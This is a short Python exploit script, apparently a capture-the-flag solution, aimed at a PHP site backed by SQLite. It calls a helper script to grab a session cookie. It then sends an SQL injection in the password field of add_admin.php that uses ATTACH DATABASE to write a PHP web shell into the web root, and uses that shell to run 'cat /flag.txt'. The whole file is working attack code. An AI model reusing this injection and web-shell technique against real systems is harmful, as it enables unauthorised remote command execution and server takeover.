import requests
import subprocess
import re
import sys

TARGET = sys.argv[1]

out = subprocess.check_output(["bash", "vzlom.sh", TARGET], stderr=subprocess.STDOUT)

sess_id = re.findall(r'PHPSESSID=[a-zA-Z0-9]+', out.decode())[0]
sess_id = sess_id.split('=')[1]

resp = requests.post(f"{TARGET}/add_admin.php", data={
    "name": "abobus",
    "password": '''abobus'); ATTACH DATABASE '/var/www/html/lol.php' AS lol; CREATE TABLE lol.pwn2 (dataz text); INSERT INTO lol.pwn2 VALUES ('<?php echo system($_GET["a"]); ?>'); -- ''',
}, cookies={
    "PHPSESSID": sess_id}, headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"})
print(resp.text)

resp = requests.get(f"{TARGET}/lol.php?a=cat /flag.txt")
print(resp.text)
